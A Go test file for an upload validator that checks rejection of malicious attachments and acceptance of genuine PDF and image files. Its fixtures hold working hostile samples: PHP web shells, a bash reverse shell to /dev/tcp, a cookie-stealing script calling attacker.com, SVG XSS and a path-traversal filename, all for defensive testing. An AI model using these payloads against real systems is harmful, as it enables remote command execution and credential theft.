package security

import (
	"strings"
	"testing"
)

func TestValidateAttachment_Security(t *testing.T) {
	tests := []struct {
		name        string
		filename    string
		data        []byte
		maxBytes    int64
		wantErr     bool
		errContains string
	}{
		{
			name:        "Reject direct PHP script",
			filename:    "backdoor.php",
			data:        []byte("<?php system($_GET['cmd']); ?>"),
			maxBytes:    10 * 1024 * 1024,
			wantErr:     true,
			errContains: "strictly prohibited",
		},
		{
			name:        "Reject shell script",
			filename:    "reverse_shell.sh",
			data:        []byte("#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"),
			maxBytes:    10 * 1024 * 1024,
			wantErr:     true,
			errContains: "strictly prohibited",
		},
		{
			name:        "Reject executable file",
			filename:    "payload.exe",
			data:        []byte("MZ\x90\x00\x03\x00\x00\x00"),
			maxBytes:    10 * 1024 * 1024,
			wantErr:     true,
			errContains: "strictly prohibited",
		},
		{
			name:        "Reject double extension (shell.php.jpg)",
			filename:    "shell.php.jpg",
			data:        []byte("\xFF\xD8\xFF\xE0\x00\x10JFIF"),
			maxBytes:    10 * 1024 * 1024,
			wantErr:     true,
			errContains: "double extension",
		},
		{
			name:        "Reject disguised PHP disguised as PDF (wrong magic bytes)",
			filename:    "invoice.pdf",
			data:        []byte("<?php eval($_POST['pass']); ?>"),
			maxBytes:    10 * 1024 * 1024,
			wantErr:     true,
			errContains: "signature",
		},
		{
			name:        "Reject HTML/XSS file",
			filename:    "stealer.html",
			data:        []byte("<script>fetch('http://attacker.com?c='+document.cookie)</script>"),
			maxBytes:    10 * 1024 * 1024,
			wantErr:     true,
			errContains: "strictly prohibited",
		},
		{
			name:        "Reject SVG file (prevent SVG XSS)",
			filename:    "vector.svg",
			data:        []byte("<svg onload=alert(1)></svg>"),
			maxBytes:    10 * 1024 * 1024,
			wantErr:     true,
			errContains: "strictly prohibited",
		},
		{
			name:        "Accept genuine PDF",
			filename:    "quotation.pdf",
			data:        []byte("%PDF-1.4\n1 0 obj\n<< /Title (Quote) >>\nendobj"),
			maxBytes:    10 * 1024 * 1024,
			wantErr:     false,
		},
		{
			name:        "Accept genuine PNG",
			filename:    "spec_diagram.png",
			data:        []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D},
			maxBytes:    10 * 1024 * 1024,
			wantErr:     false,
		},
		{
			name:        "Accept genuine JPEG",
			filename:    "photo.jpg",
			data:        []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46},
			maxBytes:    10 * 1024 * 1024,
			wantErr:     false,
		},
		{
			name:        "Sanitize path traversal",
			filename:    "../../../../etc/passwd.pdf",
			data:        []byte("%PDF-1.7\ntraversal test"),
			maxBytes:    10 * 1024 * 1024,
			wantErr:     false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cleanName, _, err := ValidateAttachment(tt.filename, tt.data, tt.maxBytes)
			if tt.wantErr {
				if err == nil {
					t.Errorf("ValidateAttachment() expected error but got none")
				} else if tt.errContains != "" && !strings.Contains(err.Error(), tt.errContains) {
					t.Errorf("ValidateAttachment() error = %v, want substring %q", err, tt.errContains)
				}
			} else {
				if err != nil {
					t.Errorf("ValidateAttachment() unexpected error: %v", err)
				}
				if strings.Contains(cleanName, "..") || strings.Contains(cleanName, "/") || strings.Contains(cleanName, "\\") {
					t.Errorf("ValidateAttachment() failed to sanitize path traversal: %s", cleanName)
				}
			}
		})
	}
}

func TestValidateImageAttachment_Security(t *testing.T) {
	tests := []struct {
		name        string
		filename    string
		data        []byte
		maxBytes    int64
		wantErr     bool
		errContains string
	}{
		{
			name:        "Reject PDF in chat (chat only accepts images)",
			filename:    "document.pdf",
			data:        []byte("%PDF-1.4\n1 0 obj\nendobj"),
			maxBytes:    5 * 1024 * 1024,
			wantErr:     true,
			errContains: "unsupported chat image format",
		},
		{
			name:        "Reject SVG in chat (prevent SVG XSS)",
			filename:    "image.svg",
			data:        []byte("<svg onload=alert(1)></svg>"),
			maxBytes:    5 * 1024 * 1024,
			wantErr:     true,
			errContains: "strictly prohibited",
		},
		{
			name:        "Reject PHP backdoor in chat",
			filename:    "cmd.php",
			data:        []byte("<?php system($_GET['cmd']); ?>"),
			maxBytes:    5 * 1024 * 1024,
			wantErr:     true,
			errContains: "strictly prohibited",
		},
		{
			name:        "Reject shell script in chat",
			filename:    "backdoor.sh",
			data:        []byte("#!/bin/bash\nwhoami"),
			maxBytes:    5 * 1024 * 1024,
			wantErr:     true,
			errContains: "strictly prohibited",
		},
		{
			name:        "Reject disguised script as PNG in chat",
			filename:    "photo.png",
			data:        []byte("<?php echo 'malicious'; ?>"),
			maxBytes:    5 * 1024 * 1024,
			wantErr:     true,
			errContains: "signature",
		},
		{
			name:        "Accept genuine PNG in chat",
			filename:    "screenshot.png",
			data:        []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D},
			maxBytes:    5 * 1024 * 1024,
			wantErr:     false,
		},
		{
			name:        "Accept genuine JPEG in chat",
			filename:    "receipt.jpg",
			data:        []byte{0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46},
			maxBytes:    5 * 1024 * 1024,
			wantErr:     false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, _, err := ValidateImageAttachment(tt.filename, tt.data, tt.maxBytes)
			if tt.wantErr {
				if err == nil {
					t.Errorf("ValidateImageAttachment() expected error but got none")
				} else if tt.errContains != "" && !strings.Contains(err.Error(), tt.errContains) {
					t.Errorf("ValidateImageAttachment() error = %v, want substring %q", err, tt.errContains)
				}
			} else {
				if err != nil {
					t.Errorf("ValidateImageAttachment() unexpected error: %v", err)
				}
			}
		})
	}
}

